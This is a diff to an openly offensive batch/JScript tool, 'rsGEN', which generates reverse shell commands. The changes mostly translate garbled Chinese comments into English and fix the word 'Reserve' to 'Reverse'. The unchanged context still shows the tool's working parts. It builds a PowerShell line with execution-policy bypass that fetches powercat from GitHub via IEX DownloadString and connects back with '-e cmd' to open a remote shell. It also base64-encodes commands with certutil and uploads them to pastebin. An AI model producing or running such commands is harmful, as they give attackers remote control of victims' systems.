@@ -1,8 +1,8 @@
 @if (@rsgen) == (@RSGEN) @end /***** JS
 @echo off
-title rsGEN - Universal Reserve Shell Command Genrator by Flyfish
+title rsGEN - Universal Reverse Shell Command Genrator by Flyfish
 
-::mainº¯Êı
+::main
 :rs_main_start
 setlocal enableDelayedExpansion
 call :rs_os_detect_start
@@ -89,7 +89,7 @@ endlocal
 goto :eof
 :rs_main_end
 
-::¼ì²âÏµÍ³°æ±¾Ê¹ÓÃANSIÑÕÉ«
+::Detect system version using ANSI color
 :rs_os_detect_start
 for /f "tokens=4-7 delims=[]. " %%i in ('ver') do (
     set /a_majorminor=%%i * 100 + %%j
@@ -111,7 +111,7 @@ if %_majorminor% geq 1000 (
 )
 :rs_os_detect_end
 
-::¼ì²éhost¸ñÊ½
+::Check host format
 :rs_check_host_start
 set rs_value=
 set rs_value=%1
@@ -124,7 +124,7 @@ if %errorlevel% equ 0 (
 goto :eof
 :rs_check_host_end
 
-::¼ì²éport¸ñÊ½
+::Check port format
 :rs_check_port_start
 set rs_value=
 set rs_value=%1
@@ -137,7 +137,7 @@ if %errorlevel% equ 0 (
 goto :eof
 :rs_check_prot_end
 
-::Ñ°ÕÒÎ´Õ¼ÓÃ¶Ë¿Ú
+::Find available ports
 :rs_set_webport_start
 netstat -o -n -a | find /i "LISTENING" | find ":%rs_webport% " > NUL
 if "%ERRORLEVEL%" equ "0" (
@@ -149,7 +149,7 @@ if "%ERRORLEVEL%" equ "0" (
 goto :eof
 :rs_set_webport_end
 
-::base64±àÂë
+::base64 encode
 :rs_base64_encode_start
 set /p<nul="%~1">"%temp%\rs_temp_input.rsg"
 certutil -f -encode "%temp%\rs_temp_input.rsg" "%temp%\rs_temp_output.rsg">nul
@@ -158,14 +158,14 @@ for /f %%i in ('findstr /b /c:"-" /v "%temp%\rs_temp_output.rsg"') do (
 )
 :rs_base64_encode_ende
 
-::ÇåÀíÁÙÊ±ÎÄ¼ş
+::Clean temporary files
 :rs_clean_tempfile_start
 if exist "%temp%\rs_temp_input.rsg" del /q %temp%\rs_temp_input.rsg
 if exist "%temp%\rs_temp_output.rsg" del /q %temp%\rs_temp_output.rsg
 goto :eof
 :rs_clean_tempfile_end
 
-::¼àÌı±¾µØ¶Ë¿Ú
+::Listen to the local port
 :rs_local_listen_start
 if exist "%cd%\command\powercat.ps1" (
     echo,
@@ -180,7 +180,7 @@ if exist "%cd%\command\powercat.ps1" (
 goto :eof
 :rs_local_listen_end
 
-::Ô­ÉúÃüÁî¸ñÊ½Êä³ö
+::Raw command format output
 :rs_command_raw_start
 if "!rs_os_flag!"=="W10" (
     echo,
@@ -224,7 +224,7 @@ echo    Your command has been generated and you can execute it on Windows/Linux 
 goto :eof
 :rs_command_raw_end
 
-::¾ÖÓòÍø"ÖĞ×ªÃüÁî"Éú³É
+::LAN "transfer command" generation
 :rs_command_lan_start
 if not exist "%cd%\command\" (
     echo,
@@ -316,7 +316,7 @@ echo    Your command has been generated and you can execute it on Windows/Linux 
 goto :eof
 :rs_command_lan_end
 
-::ÖĞ×ªÃüÁîÉú³É
+::"transfer command" generation
 :rs_command_generate_pub_start
 set "rs_ps_command_pre=&powershell -EP Bypass -NoLogo -NonI -NoP -Enc "
 set "ps_command_suf_raw=IEX (New-Object System.Net.Webclient).DownloadString(''https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'');powercat -c !rs_listen_host! -p !rs_listen_port! -e cmd"
@@ -400,7 +400,7 @@ echo    Your command has been generated and you can execute it on Windows/Linux 
 goto :eof
 :rs_command_generate_pub_end
 
-::ÉÏ´«ÃüÁîÖÁpastebin
+::Upload command to pastebin
 :rs_command_upload_start
 echo,
 echo  * Uploading command to pastebin...
@@ -433,7 +433,7 @@ if exist "%temp%\rs_temp_input.rsg" (
 goto :eof
 :rs_command_upload_end
 
-::ÄÚÇ¶js´úÂëÊµÏÖÃüÁîÉÏ´«¹¦ÄÜ
+::Embedded js code to achieve command upload function
 :rs_http_post_start
 cscript //E:JScript //nologo "%~f0" "%~nx0" %*
 goto :eof
@@ -455,13 +455,13 @@ if (args.Length == 4 ) {
     url = args.Item(1)
     data = args.Item(2).replace("+", "%2B").replace("&", "%26");
     filename = args.Item(3)
-	request(url);
+    request(url);
     WScript.Quit(666);
 }
 if (args.Length == 3 ) {
     ip = args.Item(1)
     ipfilename = args.Item(2)
-	writeFile(ipfilename,ip2dec(ip));
+    writeFile(ipfilename,ip2dec(ip));
     WScript.Quit(666);
 }
 if (args.Length == 1 ) {
@@ -540,10 +540,10 @@ echo  [92m  [___]   [\__) )[93m`._____.'^|________^|^|_____^|\____^|  [97mv1.
 goto :eof
 :rs_banner_w10_end
 
-::°ïÖúĞÅÏ¢
+::help info
 :rs_help_start
 echo,
-echo  An Universal Reserve Shell Command Genrator.(Notice: You need to provide at least host and port parameters,that is your shell ip and port.)
+echo  An Universal Reverse Shell Command Genrator.(Notice: You need to provide at least host and port parameters,that is your shell ip and port.)
 echo,
 echo Usage: %~nx0 host port [options]
 echo Options:
